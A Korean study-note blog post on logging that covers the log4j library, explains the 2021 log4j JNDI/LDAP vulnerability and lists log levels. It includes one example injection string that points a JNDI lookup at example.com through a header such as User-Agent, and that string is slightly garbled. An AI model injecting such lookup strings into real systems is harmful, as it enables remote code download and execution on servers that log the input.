**⏩ 개념**

> 로그(Log)란 프로그램 개발이나 운영 시 발생하는 문제점을 추적하거나 운영 상태를 모니터링하기 위한 텍스트이다.
> 
<br>
**⏩ log4j**

보통 log4j 라이브러리를 활용하여 로그를 저장한다.

log4j란 Java 기반의 로깅 유틸리티로, Apache에서 만든 오픈소스 라이브러리다. 

Log for Java라는 뜻으로 Jakarta-project에서 Java를 위한 프로젝트 중 하나로 처음부터 Java의 예외를 처리하기 위해 설계되었다.

프로그램 실행 시 자동으로 지정한 경로에 로그를 저장해주는 기능을 한다.

***+) log4j 취약점 ::  2021년 12월***

우선 이 취약점은 **JNDI**와 **LDAP**를 이용한다. **JNDI**는 **Java Naming and Directory Interface**의 약자로 1990년대 후반부터 Java에 추가된 인터페이스이다. Java 프로그램이 **디렉토리**를 통해 **데이터**(Java 객체 형태)를 찾을 수 있도록 하는 디렉토리 서비스이다.

JNDI는 이러한 디렉토리 서비스를 위해 **다양한 인터페이스**가 존재하는데 그 중 하나가 **LDAP**이다. 이 LDAP가 이번 취약점에 가장 중요한 포인트이다.

Java 프로그램들은 앞서 말한 JNDI와 LDAP를 통해 Java 객체를 찾을 수 있다. 예시로 URL ldap://localhost:389/o=JNDITutorial을 접속한다면 LDAP 서버에서 JNDITutorial 객체를 찾을 수 있는 것이다.

이러한 접근 인터페이스가 이번 사태에 치명적이게 된 이유는, Log4j에는 편리하게 사용하기 위해 ${prefix:name} 형식으로 **Java 객체를 볼 수 있게 하는 문법**이 존재하기 때문이다. 예를 들어 **${java:version}은 현재 실행 중인 Java 버전**을 볼 수 있게 한다.

이런 문법은 **로그가 기록될 때도 사용이 가능**했고, 결국 해커가 **로그에 기록되는 곳을 찾아 ${jndi:sndi:snd://example.com/a}과 같은 값을 추가**하기만 하면 **취약점을 이용**할 수 있는 것이다. 이 값을 넣는 방법은 **User-Agent와 같은 일반적인 HTTP 헤더**일 수도 있고 여러가지 방법이 있다.

즉, 로그가 기록되는 곳을 찾아 값을 추가하면 외부 리소스를 다운받을 주소가 공격자의 서버가 되기 때문에 아주 손쉽게 !! 악성코드가 침투하는 것이다.
<br>
**⏩ logging level**

- **FATAL**
    
    FATAL 로그는 아주 심각한 에러가 발생한 상태이다. 시스템적으로 심각한 문제가 발생해서 어플리케이션 작동이 불가능할 경우를 뜻한다.
    

- **ERROR**
    
    ERROR 로그는 프로그램 동작에 큰 문제가 발생했다는 것으로 즉시 문제를 조사해야 하는 수준이다.
    
    `예) DB를 사용할 수 없는 상태, 중요 에러가 나오는 상황`
    

- **WARN**
    
    WARN 로그는 주의해야 하지만, 프로세스는 계속 진행되는 상태를 말한다. 하지만 WARN 상태에서도 아래 2가지 문제가 발생하면 프로세스가 종료된다.
    
    - 명확한 문제 : 현재 데이터를 사용 불가, 캐시값 사용 등
    - 잠재적 문제 : 개발 모드로 프로그램 시작, 관리자 콘솔 비밀번호가 보호되지 않고 접속 등
    
- **INFO**
    
    중요한 비즈니스 프로세스가 시작될 때와 종료될 때를 알려주는 로그를 말한다.
    
    `예) ~가 ~를 실행했음`
    
- **DEBUG**
    
    개발자가 기록할 가치가 있는 정보를 남기기 위해 사용하는 레벨의 로그이다.
    

DEBUG > INFO > WARN > ERROR > FATAL 순으로 로그가 찍힌다.
<br>
**⏩ 참고**

[https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&blogId=2zino&logNo=221641662104](https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&blogId=2zino&logNo=221641662104)

[https://pig-programming.tistory.com/51](https://pig-programming.tistory.com/51)

[https://mdj1234.tistory.com/63](https://mdj1234.tistory.com/63)
